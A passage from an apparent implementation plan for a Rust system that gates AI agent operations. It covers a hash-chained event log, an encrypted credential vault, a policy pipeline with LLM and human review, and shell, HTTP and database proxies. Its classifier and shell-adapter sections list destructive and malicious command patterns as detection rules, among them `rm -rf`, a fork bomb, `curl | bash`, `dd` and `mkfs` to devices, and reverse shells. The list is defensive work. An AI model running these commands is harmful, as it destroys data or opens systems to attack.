            timestamp: chrono::DateTime::parse_from_rfc3339(&self.timestamp)?.with_timezone(&chrono::Utc),
            mission_id: MissionId::from_uuid(self.mission_id.parse()?),
            event_type: serde_json::from_str(&self.event_type)?,
            parent_event: self.parent_event.and_then(|s| s.parse().ok().map(EventId::from_uuid)),
            payload: serde_json::from_str(&self.payload)?,
            prev_hash: self.prev_hash,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_append_and_retrieve() {
        let mut log = EventLog::new(":memory:").unwrap();
        let mid = MissionId::new();
        let event = log
            .append(mid, TraceEventType::MissionCreated, None, serde_json::json!({"goal": "test"}))
            .unwrap();
        assert_eq!(event.sequence, 0);
        assert_eq!(event.prev_hash, "genesis");

        let events = log.get_events_for_mission(&mid).unwrap();
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn test_chain_integrity() {
        let mut log = EventLog::new(":memory:").unwrap();
        let mid = MissionId::new();
        log.append(mid, TraceEventType::MissionCreated, None, serde_json::json!({})).unwrap();
        log.append(mid, TraceEventType::OperationRequested, None, serde_json::json!({})).unwrap();
        log.append(mid, TraceEventType::OperationAllowed, None, serde_json::json!({})).unwrap();
        assert!(log.verify_chain_integrity().unwrap());
    }
}
```

**Step 3: Implement graph (stub with query interface)**

`crates/mc-trace/src/graph.rs`:
```rust
use anyhow::Result;
use mc_core::id::{EventId, MissionId};
use mc_core::trace::{EdgeType, GraphEdge, GraphFormat, GraphNode};
use rusqlite::Connection;

pub struct MissionGraph {
    conn: Connection,
}

impl MissionGraph {
    pub fn new(path: &str) -> Result<Self> {
        let conn = if path == ":memory:" {
            Connection::open_in_memory()?
        } else {
            Connection::open(path)?
        };
        let graph = Self { conn };
        graph.init_schema()?;
        Ok(graph)
    }

    fn init_schema(&self) -> Result<()> {
        self.conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS nodes (
                id TEXT PRIMARY KEY,
                node_type TEXT NOT NULL,
                data TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS edges (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                from_id TEXT NOT NULL,
                to_id TEXT NOT NULL,
                edge_type TEXT NOT NULL,
                FOREIGN KEY (from_id) REFERENCES nodes(id),
                FOREIGN KEY (to_id) REFERENCES nodes(id)
            );
            CREATE INDEX IF NOT EXISTS idx_edges_from ON edges(from_id);
            CREATE INDEX IF NOT EXISTS idx_edges_to ON edges(to_id);",
        )?;
        Ok(())
    }

    pub fn add_node(&self, id: &str, node: &GraphNode) -> Result<()> {
        let node_type = match node {
            GraphNode::Mission { .. } => "mission",
            GraphNode::Operation { .. } => "operation",
            GraphNode::Decision { .. } => "decision",
        };
        self.conn.execute(
            "INSERT OR REPLACE INTO nodes (id, node_type, data) VALUES (?1, ?2, ?3)",
            rusqlite::params![id, node_type, serde_json::to_string(node)?],
        )?;
        Ok(())
    }

    pub fn add_edge(&self, edge: &GraphEdge) -> Result<()> {
        self.conn.execute(
            "INSERT INTO edges (from_id, to_id, edge_type) VALUES (?1, ?2, ?3)",
            rusqlite::params![
                edge.from.to_string(),
                edge.to.to_string(),
                serde_json::to_string(&edge.edge_type)?
            ],
        )?;
        Ok(())
    }

    pub fn get_children(&self, node_id: &str) -> Result<Vec<GraphNode>> {
        let mut stmt = self.conn.prepare(
            "SELECT n.data FROM nodes n JOIN edges e ON n.id = e.to_id WHERE e.from_id = ?",
        )?;
        let nodes: Vec<GraphNode> = stmt
            .query_map([node_id], |row| {
                let data: String = row.get(0)?;
                Ok(data)
            })?
            .filter_map(|r| r.ok())
            .filter_map(|data| serde_json::from_str(&data).ok())
            .collect();
        Ok(nodes)
    }

    pub fn export(&self, format: GraphFormat) -> Result<String> {
        match format {
            GraphFormat::Dot => self.export_dot(),
            GraphFormat::Json => self.export_json(),
        }
    }

    fn export_dot(&self) -> Result<String> {
        let mut dot = String::from("digraph mission_graph {\n");
        let mut stmt = self.conn.prepare("SELECT id, node_type, data FROM nodes")?;
        let nodes: Vec<(String, String, String)> = stmt
            .query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)))?
            .filter_map(|r| r.ok())
            .collect();

        for (id, node_type, _data) in &nodes {
            let short_id = &id[..8.min(id.len())];
            dot.push_str(&format!("  \"{id}\" [label=\"{short_id}\\n{node_type}\"];\n"));
        }

        let mut stmt = self.conn.prepare("SELECT from_id, to_id, edge_type FROM edges")?;
        let edges: Vec<(String, String, String)> = stmt
            .query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)))?
            .filter_map(|r| r.ok())
            .collect();

        for (from, to, edge_type) in &edges {
            dot.push_str(&format!("  \"{from}\" -> \"{to}\" [label=\"{edge_type}\"];\n"));
        }

        dot.push_str("}\n");
        Ok(dot)
    }

    fn export_json(&self) -> Result<String> {
        let mut stmt = self.conn.prepare("SELECT data FROM nodes")?;
        let nodes: Vec<serde_json::Value> = stmt
            .query_map([], |row| {
                let data: String = row.get(0)?;
                Ok(data)
            })?
            .filter_map(|r| r.ok())
            .filter_map(|data| serde_json::from_str(&data).ok())
            .collect();

        let mut stmt = self.conn.prepare("SELECT from_id, to_id, edge_type FROM edges")?;
        let edges: Vec<serde_json::Value> = stmt
            .query_map([], |row| {
                let from: String = row.get(0)?;
                let to: String = row.get(1)?;
                let etype: String = row.get(2)?;
                Ok(serde_json::json!({"from": from, "to": to, "type": etype}))
            })?
            .filter_map(|r| r.ok())
            .collect();

        Ok(serde_json::to_string_pretty(&serde_json::json!({
            "nodes": nodes,
            "edges": edges,
        }))?)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use mc_core::id::RequestId;

    #[test]
    fn test_add_and_query_nodes() {
        let graph = MissionGraph::new(":memory:").unwrap();
        let mid = MissionId::new();
        let node = GraphNode::Mission {
            id: mid,
            goal: "test mission".to_string(),
        };
        graph.add_node(&mid.to_string(), &node).unwrap();

        let rid = RequestId::new();
        let op_node = GraphNode::Operation {
            id: rid,
            resource: "http://api.com/test".to_string(),
        };
        graph.add_node(&rid.to_string(), &op_node).unwrap();

        let edge = GraphEdge {
            from: EventId::from_uuid(*mid.as_uuid()),
            to: EventId::from_uuid(*rid.as_uuid()),
            edge_type: EdgeType::Performed,
        };
        graph.add_edge(&edge).unwrap();

        let children = graph.get_children(&mid.to_string()).unwrap();
        assert_eq!(children.len(), 1);
    }

    #[test]
    fn test_export_dot() {
        let graph = MissionGraph::new(":memory:").unwrap();
        let mid = MissionId::new();
        let node = GraphNode::Mission {
            id: mid,
            goal: "test".to_string(),
        };
        graph.add_node(&mid.to_string(), &node).unwrap();

        let dot = graph.export(GraphFormat::Dot).unwrap();
        assert!(dot.contains("digraph"));
        assert!(dot.contains("mission"));
    }
}
```

**Step 4: Create query module and lib.rs**

`crates/mc-trace/src/query.rs`:
```rust
use anyhow::Result;
use mc_core::id::{EventId, MissionId};
use mc_core::trace::TraceEvent;

use crate::event_log::EventLog;

/// Filter for querying denials.
pub struct DenialFilter {
    pub mission_id: Option<MissionId>,
    pub limit: u32,
}

impl Default for DenialFilter {
    fn default() -> Self {
        Self {
            mission_id: None,
            limit: 100,
        }
    }
}

/// High-level query interface over the trace system.
pub struct TraceQueryEngine<'a> {
    event_log: &'a EventLog,
}

impl<'a> TraceQueryEngine<'a> {
    pub fn new(event_log: &'a EventLog) -> Self {
        Self { event_log }
    }

    pub fn mission_events(&self, mission_id: &MissionId) -> Result<Vec<TraceEvent>> {
        self.event_log.get_events_for_mission(mission_id)
    }

    pub fn recent_events(&self, limit: u32) -> Result<Vec<TraceEvent>> {
        self.event_log.get_recent(limit)
    }
}
```

`crates/mc-trace/src/lib.rs`:
```rust
pub mod event_log;
pub mod graph;
pub mod query;
```

**Step 5: Run tests**

Run: `cargo test -p mc-trace`
Expected: All pass

**Step 6: Commit**

```bash
git add crates/mc-trace/
git commit -m "feat(mc-trace): event log with cryptographic chaining and mission graph"
```

---

### Task 6: mc-vault Crate — Encrypted Credential Store

**Files:**
- Create: `crates/mc-vault/Cargo.toml`
- Create: `crates/mc-vault/src/lib.rs`
- Create: `crates/mc-vault/src/crypto.rs`
- Create: `crates/mc-vault/src/store.rs`
- Create: `crates/mc-vault/src/rotation.rs`

**Step 1: Create crate**

`crates/mc-vault/Cargo.toml`:
```toml
[package]
name = "mc-vault"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
serde.workspace = true
serde_json.workspace = true
thiserror.workspace = true
anyhow.workspace = true
rusqlite = { version = "0.32", features = ["bundled"] }
aes-gcm = "0.10"
argon2 = "0.5"
rand = "0.8"
zeroize = { version = "1", features = ["derive"] }
tracing.workspace = true
```

**Step 2: Implement crypto module**

`crates/mc-vault/src/crypto.rs`:
```rust
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use anyhow::{Context, Result};
use argon2::Argon2;
use rand::RngCore;
use zeroize::Zeroize;

const NONCE_SIZE: usize = 12;
const KEY_SIZE: usize = 32;
const SALT_SIZE: usize = 32;

/// Derives a 256-bit key from a passphrase using Argon2id.
pub fn derive_key(passphrase: &str, salt: &[u8]) -> Result<[u8; KEY_SIZE]> {
    let mut key = [0u8; KEY_SIZE];
    Argon2::default()
        .hash_password_into(passphrase.as_bytes(), salt, &mut key)
        .map_err(|e| anyhow::anyhow!("key derivation failed: {e}"))?;
    Ok(key)
}

/// Generates a random salt.
pub fn generate_salt() -> [u8; SALT_SIZE] {
    let mut salt = [0u8; SALT_SIZE];
    rand::thread_rng().fill_bytes(&mut salt);
    salt
}

/// Encrypts plaintext with AES-256-GCM. Returns nonce || ciphertext.
pub fn encrypt(key: &[u8; KEY_SIZE], plaintext: &[u8]) -> Result<Vec<u8>> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let mut nonce_bytes = [0u8; NONCE_SIZE];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| anyhow::anyhow!("encryption failed: {e}"))?;

    let mut result = nonce_bytes.to_vec();
    result.extend_from_slice(&ciphertext);
    Ok(result)
}

/// Decrypts nonce || ciphertext with AES-256-GCM.
pub fn decrypt(key: &[u8; KEY_SIZE], data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < NONCE_SIZE {
        anyhow::bail!("ciphertext too short");
    }
    let (nonce_bytes, ciphertext) = data.split_at(NONCE_SIZE);
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| anyhow::anyhow!("decryption failed: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let salt = generate_salt();
        let key = derive_key("test-passphrase", &salt).unwrap();
        let plaintext = b"super secret api key";
        let encrypted = encrypt(&key, plaintext).unwrap();
        let decrypted = decrypt(&key, &encrypted).unwrap();
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_wrong_key_fails() {
        let salt = generate_salt();
        let key1 = derive_key("password1", &salt).unwrap();
        let key2 = derive_key("password2", &salt).unwrap();
        let encrypted = encrypt(&key1, b"secret").unwrap();
        assert!(decrypt(&key2, &encrypted).is_err());
    }
}
```

**Step 3: Implement vault store**

`crates/mc-vault/src/store.rs`:
```rust
use anyhow::{Context, Result};
use mc_core::id::VaultEntryId;
use mc_core::resource::ResourcePattern;
use mc_core::vault::{Credential, SecretType, VaultEntryMetadata};
use rusqlite::Connection;
use std::collections::HashSet;

use crate::crypto;

pub struct VaultStore {
    conn: Connection,
    master_key: [u8; 32],
}

impl VaultStore {
    pub fn new(path: &str, passphrase: &str) -> Result<Self> {
        let conn = if path == ":memory:" {
            Connection::open_in_memory()?
        } else {
            Connection::open(path)?
        };

        let store = Self {
            conn,
            master_key: [0u8; 32],
        };
        store.init_schema()?;

        // Derive or verify master key
        let salt = store.get_or_create_salt()?;
        let master_key = crypto::derive_key(passphrase, &salt)?;

        Ok(Self {
            conn: store.conn,
            master_key,
        })
    }

    fn init_schema(&self) -> Result<()> {
        self.conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS vault_meta (
                key TEXT PRIMARY KEY,
                value BLOB NOT NULL
            );
            CREATE TABLE IF NOT EXISTS entries (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL UNIQUE,
                secret_type TEXT NOT NULL,
                encrypted_value BLOB NOT NULL,
                bound_to TEXT NOT NULL,
                rotation_policy TEXT,
                created_at TEXT NOT NULL,
                last_rotated TEXT,
                revoked INTEGER NOT NULL DEFAULT 0
            );",
        )?;
        Ok(())
    }

    fn get_or_create_salt(&self) -> Result<Vec<u8>> {
        let existing: Option<Vec<u8>> = self
            .conn
            .query_row(
                "SELECT value FROM vault_meta WHERE key = 'salt'",
                [],
                |row| row.get(0),
            )
            .ok();

        if let Some(salt) = existing {
            Ok(salt)
        } else {
            let salt = crypto::generate_salt().to_vec();
            self.conn.execute(
                "INSERT INTO vault_meta (key, value) VALUES ('salt', ?)",
                [&salt],
            )?;
            Ok(salt)
        }
    }

    pub fn add(
        &self,
        name: &str,
        secret_type: SecretType,
        value: &str,
        bound_to: HashSet<ResourcePattern>,
    ) -> Result<VaultEntryId> {
        let id = VaultEntryId::new();
        let encrypted = crypto::encrypt(&self.master_key, value.as_bytes())?;
        let bound_json = serde_json::to_string(&bound_to)?;
        let now = chrono::Utc::now().to_rfc3339();

        self.conn.execute(
            "INSERT INTO entries (id, name, secret_type, encrypted_value, bound_to, created_at, revoked)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, 0)",
            rusqlite::params![
                id.to_string(),
                name,
                serde_json::to_string(&secret_type)?,
                encrypted,
                bound_json,
                now,
            ],
        )?;

        Ok(id)
    }

    pub fn get_credential(&self, id: &VaultEntryId) -> Result<Credential> {
        let (encrypted, secret_type_str): (Vec<u8>, String) = self.conn.query_row(
            "SELECT encrypted_value, secret_type FROM entries WHERE id = ? AND revoked = 0",
            [id.to_string()],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )?;

        let value = crypto::decrypt(&self.master_key, &encrypted)?;
        let secret_type: SecretType = serde_json::from_str(&secret_type_str)?;

        Ok(Credential {
            entry_id: *id,
            secret_type,
            value: String::from_utf8(value)?,
        })
    }

    pub fn find_for_resource(&self, resource: &mc_core::resource::ResourceUri) -> Result<Vec<VaultEntryId>> {
        let mut stmt = self.conn.prepare(
            "SELECT id, bound_to FROM entries WHERE revoked = 0",
        )?;

        let entries: Vec<VaultEntryId> = stmt
            .query_map([], |row| {
                let id_str: String = row.get(0)?;
                let bound_str: String = row.get(1)?;
                Ok((id_str, bound_str))
            })?
            .filter_map(|r| r.ok())
            .filter_map(|(id_str, bound_str)| {
                let id = VaultEntryId::from_uuid(id_str.parse().ok()?);
                let patterns: HashSet<ResourcePattern> = serde_json::from_str(&bound_str).ok()?;
                if patterns.iter().any(|p| p.matches(resource)) {
                    Some(id)
                } else {
                    None
                }
            })
            .collect();

        Ok(entries)
    }

    pub fn list(&self) -> Result<Vec<VaultEntryMetadata>> {
        let mut stmt = self.conn.prepare(
            "SELECT id, name, secret_type, bound_to, rotation_policy, created_at, last_rotated, revoked FROM entries",
        )?;

        let entries: Vec<VaultEntryMetadata> = stmt
            .query_map([], |row| {
                let id_str: String = row.get(0)?;
                let name: String = row.get(1)?;
                let st_str: String = row.get(2)?;
                let bound_str: String = row.get(3)?;
                let rot_str: Option<String> = row.get(4)?;
                let created: String = row.get(5)?;
                let rotated: Option<String> = row.get(6)?;
                let revoked: bool = row.get(7)?;
                Ok((id_str, name, st_str, bound_str, rot_str, created, rotated, revoked))
            })?
            .filter_map(|r| r.ok())
            .filter_map(|(id_str, name, st_str, bound_str, rot_str, created, rotated, revoked)| {
                Some(VaultEntryMetadata {
                    id: VaultEntryId::from_uuid(id_str.parse().ok()?),
                    name,
                    secret_type: serde_json::from_str(&st_str).ok()?,
                    bound_to: serde_json::from_str(&bound_str).ok()?,
                    rotation_policy: rot_str.and_then(|s| serde_json::from_str(&s).ok()),
                    created_at: chrono::DateTime::parse_from_rfc3339(&created).ok()?.with_timezone(&chrono::Utc),
                    last_rotated: rotated.and_then(|s| chrono::DateTime::parse_from_rfc3339(&s).ok().map(|d| d.with_timezone(&chrono::Utc))),
                    revoked,
                })
            })
            .collect();

        Ok(entries)
    }

    pub fn revoke(&self, id: &VaultEntryId) -> Result<()> {
        self.conn.execute(
            "UPDATE entries SET revoked = 1 WHERE id = ?",
            [id.to_string()],
        )?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_add_and_retrieve() {
        let store = VaultStore::new(":memory:", "test-pass").unwrap();
        let mut bound = HashSet::new();
        bound.insert(ResourcePattern::new("http://api.com/**").unwrap());
        let id = store.add("test-key", SecretType::ApiKey, "sk-12345", bound).unwrap();
        let cred = store.get_credential(&id).unwrap();
        assert_eq!(cred.value, "sk-12345");
    }

    #[test]
    fn test_find_for_resource() {
        let store = VaultStore::new(":memory:", "test-pass").unwrap();
        let mut bound = HashSet::new();
        bound.insert(ResourcePattern::new("http://api.github.com/**").unwrap());
        let id = store.add("github-token", SecretType::BearerToken, "ghp_xxx", bound).unwrap();

        let uri = mc_core::resource::ResourceUri::new("http://api.github.com/repos/foo").unwrap();
        let found = store.find_for_resource(&uri).unwrap();
        assert_eq!(found.len(), 1);
        assert_eq!(found[0], id);
    }

    #[test]
    fn test_revoke() {
        let store = VaultStore::new(":memory:", "test-pass").unwrap();
        let mut bound = HashSet::new();
        bound.insert(ResourcePattern::new("http://api.com/**").unwrap());
        let id = store.add("key", SecretType::ApiKey, "secret", bound).unwrap();
        store.revoke(&id).unwrap();
        assert!(store.get_credential(&id).is_err());
    }
}
```

**Step 4: Create rotation stub and lib.rs**

`crates/mc-vault/src/rotation.rs`:
```rust
// Rotation logic — to be expanded
use mc_core::vault::RotationPolicy;

pub fn should_rotate(policy: &RotationPolicy, last_rotated: &chrono::DateTime<chrono::Utc>) -> bool {
    match policy {
        RotationPolicy::TimeBased { interval_days } => {
            let elapsed = chrono::Utc::now() - *last_rotated;
            elapsed.num_days() >= *interval_days as i64
        }
        RotationPolicy::UsageBased { .. } => {
            // Requires usage counter tracking — implemented in store
            false
        }
    }
}
```

`crates/mc-vault/src/lib.rs`:
```rust
pub mod crypto;
pub mod store;
pub mod rotation;
```

**Step 5: Run tests**

Run: `cargo test -p mc-vault`
Expected: All pass

**Step 6: Commit**

```bash
git add crates/mc-vault/
git commit -m "feat(mc-vault): encrypted credential store with AES-256-GCM"
```

---

### Task 7: mc-kernel Crate — Mission Manager & Capability Checker

**Files:**
- Create: `crates/mc-kernel/Cargo.toml`
- Create: `crates/mc-kernel/src/lib.rs`
- Create: `crates/mc-kernel/src/manager.rs`
- Create: `crates/mc-kernel/src/checker.rs`
- Create: `crates/mc-kernel/src/classifier.rs`

**Step 1: Create crate**

`crates/mc-kernel/Cargo.toml`:
```toml
[package]
name = "mc-kernel"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
mc-trace = { path = "../mc-trace" }
serde.workspace = true
serde_json.workspace = true
thiserror.workspace = true
anyhow.workspace = true
chrono.workspace = true
tracing.workspace = true
```

**Step 2: Implement mission manager**

`crates/mc-kernel/src/manager.rs` — manages mission tree, delegation, lifecycle.

Key functions:
- `create_root_mission(goal, capabilities, policies) -> Mission`
- `delegate(parent_id, goal, capabilities, policies) -> Mission`
- `complete(id)`, `fail(id)`, `suspend(id)`, `resume(id)`
- `revoke(id)` — cascading
- `get(id) -> Mission`, `get_children(id) -> Vec<Mission>`
- `resolve_token(token) -> MissionId`

Implementation stores missions in a `HashMap<MissionId, Mission>` with a token-to-mission index. Delegation validates capability narrowing via `Capability::can_delegate_to` and checks depth limits.

Write tests for: creation, delegation, revocation cascade, depth limit, invalid broadening rejection.

**Step 3: Implement capability checker**

`crates/mc-kernel/src/checker.rs` — fast-path O(1) capability lookup.

Key function: `check(mission_id, resource, operation) -> Option<CapabilityId>`

Maintains a lookup index: `HashMap<MissionId, Vec<Capability>>`. On each request, iterates the mission's capabilities and returns the first match.

Write tests for: matching, no-match denial, expired constraints.

**Step 4: Implement operation classifier**

`crates/mc-kernel/src/classifier.rs` — deterministic classification of operations.

Key function: `classify(request: &OperationRequest) -> OperationClassification`

Pattern matching rules:
- Shell commands: `rm -rf` → Catastrophic/Irreversible, `chmod 777` → High, `curl | bash` → KnownMalicious
- SQL: `DROP` → Catastrophic, `DELETE FROM ... (no WHERE)` → High, `SELECT` → None
- HTTP: unknown destination → Unknown trust, POST to external → Outbound
- Known malicious patterns: fork bombs, reverse shells, base64-encoded exfiltration

Write tests for each classification pattern.

**Step 5: Run tests**

Run: `cargo test -p mc-kernel`

**Step 6: Commit**

```bash
git add crates/mc-kernel/
git commit -m "feat(mc-kernel): mission manager, capability checker, operation classifier"
```

---

### Task 8: mc-policy Crate — Deterministic Evaluator

**Files:**
- Create: `crates/mc-policy/Cargo.toml`
- Create: `crates/mc-policy/src/lib.rs`
- Create: `crates/mc-policy/src/deterministic.rs`
- Create: `crates/mc-policy/src/pipeline.rs`
- Create: `crates/mc-policy/src/taint.rs`

**Step 1: Create crate**

`crates/mc-policy/Cargo.toml`:
```toml
[package]
name = "mc-policy"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
mc-kernel = { path = "../mc-kernel" }
mc-trace = { path = "../mc-trace" }
serde.workspace = true
serde_json.workspace = true
thiserror.workspace = true
anyhow.workspace = true
chrono.workspace = true
tokio.workspace = true
tracing.workspace = true
```

**Step 2: Implement deterministic evaluator**

`crates/mc-policy/src/deterministic.rs` — evaluates hard rules against classification.

Built-in rules from the design:
- `no-catastrophic-destruction`: deny when destructiveness == Catastrophic AND reversibility == Irreversible
- `no-exfiltration`: deny when data_flow == ExfiltrationSuspected
- `no-self-modification`: deny when target contains 'mission-clearance' or 'system-prompt'
- `no-privilege-escalation`: deny when pattern == KnownMalicious and matches escalation patterns
- `unknown-destination-review`: escalate when data_flow == Outbound AND target_trust == Unknown
- `goal-drift-detection`: escalate when goal_relevance == Unrelated or Contradictory

Implements `PolicyEvaluator` trait.

Write tests for each built-in rule.

**Step 3: Implement taint tracker**

`crates/mc-policy/src/taint.rs` — tracks tainted values from vault through operations.

`TaintTracker` maintains `HashSet<String>` of tainted value hashes. When a vault credential is accessed, its hash is added. When an outbound request body contains a tainted hash, flag as exfiltration.

Write tests for: taint registration, detection in outbound, no false positive on inbound.

**Step 4: Implement pipeline orchestrator**

`crates/mc-policy/src/pipeline.rs` — chains evaluators in order.

```rust
pub struct PolicyPipeline {
    evaluators: Vec<Box<dyn PolicyEvaluator>>,
}
```

Iterates evaluators in order. If any returns Deny → stop, return Deny. If Allow → continue to next (or return Allow if last). If Escalate → pass to next evaluator.

Write tests for: deny short-circuit, allow passthrough, escalation chain.

**Step 5: Run tests**

Run: `cargo test -p mc-policy`

**Step 6: Commit**

```bash
git add crates/mc-policy/
git commit -m "feat(mc-policy): deterministic evaluator, taint tracker, pipeline"
```

---

### Task 9: mc-policy — LLM Judge & Human-in-the-Loop

**Files:**
- Create: `crates/mc-policy/src/llm_judge.rs`
- Create: `crates/mc-policy/src/human.rs`

**Step 1: Implement LLM judge**

`crates/mc-policy/src/llm_judge.rs`:

Uses `reqwest` to call an LLM API (Anthropic Claude). Constructs a prompt with:
- Mission goal and chain
- Recent operations summary
- Current operation request + classification
- Anomaly history

Parses LLM response into Allow/Deny/Escalate with reasoning.

Implements `PolicyEvaluator` trait. Has a `MockLlmJudge` for testing that returns configurable decisions.

Add `reqwest` to mc-policy Cargo.toml dependencies.

Write tests using `MockLlmJudge`.

**Step 2: Implement human-in-the-loop**

`crates/mc-policy/src/human.rs`:

Supports multiple interfaces:
- `TerminalHuman`: Prompts on stdout, reads from stdin (using tokio::io)
- `WebhookHuman`: Sends POST to a webhook URL, waits for callback
- `MockHuman`: Returns configurable decisions for testing

Presents full context: mission goal, operation, classification, LLM reasoning.

Implements `PolicyEvaluator` trait with configurable timeout (default 5min → auto-deny).

Write tests using `MockHuman`.

**Step 3: Run tests**

Run: `cargo test -p mc-policy`

**Step 4: Commit**

```bash
git add crates/mc-policy/src/llm_judge.rs crates/mc-policy/src/human.rs
git commit -m "feat(mc-policy): LLM judge and human-in-the-loop evaluators"
```

---

### Task 10: mc-adapters Crate — Adapter Trait & Tool Call Adapter

**Files:**
- Create: `crates/mc-adapters/Cargo.toml`
- Create: `crates/mc-adapters/src/lib.rs`
- Create: `crates/mc-adapters/src/tool_call.rs`

**Step 1: Create crate with adapter trait**

`crates/mc-adapters/Cargo.toml`:
```toml
[package]
name = "mc-adapters"
version.workspace = true
edition.workspace = true

[dependencies]
mc-core = { path = "../mc-core" }
mc-kernel = { path = "../mc-kernel" }
mc-policy = { path = "../mc-policy" }
mc-vault = { path = "../mc-vault" }
mc-trace = { path = "../mc-trace" }
serde.workspace = true
serde_json.workspace = true
thiserror.workspace = true
anyhow.workspace = true
tokio.workspace = true
tracing.workspace = true
hyper = { version = "1", features = ["full"] }
hyper-util = { version = "0.1", features = ["full"] }
http-body-util = "0.1"
tokio-rustls = "0.26"
```

`crates/mc-adapters/src/lib.rs`:
```rust
use anyhow::Result;
use async_trait::async_trait;
use mc_core::id::MissionToken;
use mc_core::operation::OperationRequest;
use mc_core::policy::PolicyDecision;
use mc_core::vault::Credential;

pub mod tool_call;
pub mod http;
pub mod shell;
pub mod db;

/// Raw bytes for adapter-specific request/response.
pub struct RawRequest {
    pub data: Vec<u8>,
    pub metadata: serde_json::Value,
}

pub struct RawResponse {
    pub data: Vec<u8>,
    pub metadata: serde_json::Value,
}

#[async_trait]
pub trait ProtocolAdapter: Send + Sync {
    fn name(&self) -> &str;
    async fn identify_mission(&self, raw: &RawRequest) -> Result<MissionToken>;
    async fn normalize(&self, raw: &RawRequest) -> Result<OperationRequest>;
    async fn inject_credentials(&self, raw: &mut RawRequest, creds: &[Credential]) -> Result<()>;
    async fn forward(&self, raw: RawRequest) -> Result<RawResponse>;
    fn deny(&self, reason: &PolicyDecision) -> RawResponse;
}
```

Add `async-trait = "0.1"` to workspace dependencies and mc-adapters.

**Step 2: Implement tool call adapter**

`crates/mc-adapters/src/tool_call.rs`:

Receives JSON tool call requests `{ "tool": "name", "arguments": {...}, "mission_token": "..." }`.
Normalizes to `OperationRequest` with `OperationContext::ToolCall`.
Resource URI: `tool://<tool_name>`.
Credential injection: fills specified parameter fields.

Write tests for: normalization, credential injection, denial response.

**Step 3: Run tests**

Run: `cargo test -p mc-adapters`

**Step 4: Commit**

```bash
git add crates/mc-adapters/
git commit -m "feat(mc-adapters): adapter trait and tool call adapter"
```

---

### Task 11: mc-adapters — HTTP Proxy

**Files:**
- Create: `crates/mc-adapters/src/http.rs`

**Step 1: Implement HTTP proxy adapter**

Uses `hyper` to run an HTTP proxy server. Intercepts CONNECT for HTTPS (MITM with generated CA). Extracts `X-Mission-Token` header. Normalizes URL → resource URI, method → operation. Injects `Authorization` headers from vault.

Key components:
- `HttpProxyAdapter` struct with `listen_addr`, `ca_cert`, `ca_key`
- `start()` method that spawns a tokio task running the proxy
- Request interception → normalize → check with kernel → inject credentials → forward

Write tests using `hyper` test utilities: mock upstream server, send request through proxy, verify interception.

**Step 2: Run tests**

Run: `cargo test -p mc-adapters -- http`

**Step 3: Commit**

```bash
git add crates/mc-adapters/src/http.rs
git commit -m "feat(mc-adapters): HTTP proxy adapter with credential injection"
```

---

### Task 12: mc-adapters — Shell Adapter

**Files:**
- Create: `crates/mc-adapters/src/shell.rs`

**Step 1: Implement shell adapter**

Wraps command execution. Before executing any shell command:
1. Parses command string into command + args
2. Creates `OperationRequest` with `OperationContext::Shell`
3. Resource URI: `shell://localhost/bin/<command>`
4. Submits to kernel for evaluation
5. If allowed, executes via `tokio::process::Command` with injected env vars
6. If denied, returns error message

Dangerous command database: `rm -rf`, `mkfs`, `dd if=`, `:(){:|:&};:`, `chmod 777`, `> /dev/sda`, etc.

Write tests for: command parsing, dangerous command detection, env var injection.

**Step 2: Run tests**

Run: `cargo test -p mc-adapters -- shell`

**Step 3: Commit**

```bash
git add crates/mc-adapters/src/shell.rs
git commit -m "feat(mc-adapters): shell adapter with dangerous command detection"
```

---

### Task 13: mc-adapters — DB Proxy (Postgres Wire Protocol)

**Files:**
- Create: `crates/mc-adapters/src/db.rs`

**Step 1: Implement DB proxy adapter**

Simplified Postgres wire protocol proxy:
- Listens on a local port
- Accepts connections, reads startup message
- Proxies to upstream Postgres with real credentials (from vault)
- Intercepts `Query` messages, parses SQL
- Classifies: `SELECT` → Read, `INSERT/UPDATE` → Write, `DELETE` → Delete, `DROP/TRUNCATE` → Delete+Catastrophic
- Resource URI: `db://<host>/<database>/<table>` (extracted from SQL)

Add `sqlparser = "0.52"` to dependencies for SQL parsing.

Write tests for: SQL classification, connection proxying (mock), credential rewriting.

**Step 2: Run tests**

Run: `cargo test -p mc-adapters -- db`

**Step 3: Commit**

```bash
git add crates/mc-adapters/src/db.rs
git commit -m "feat(mc-adapters): Postgres wire protocol proxy adapter"
```

---

### Task 14: mc-api Crate — HTTP API Server

**Files:**
- Create: `crates/mc-api/Cargo.toml`
- Create: `crates/mc-api/src/lib.rs`
- Create: `crates/mc-api/src/routes/mod.rs`
- Create: `crates/mc-api/src/routes/missions.rs`
- Create: `crates/mc-api/src/routes/vault.rs`
- Create: `crates/mc-api/src/routes/trace.rs`
- Create: `crates/mc-api/src/routes/policies.rs`
- Create: `crates/mc-api/src/routes/operations.rs`

**Step 1: Create crate with axum**

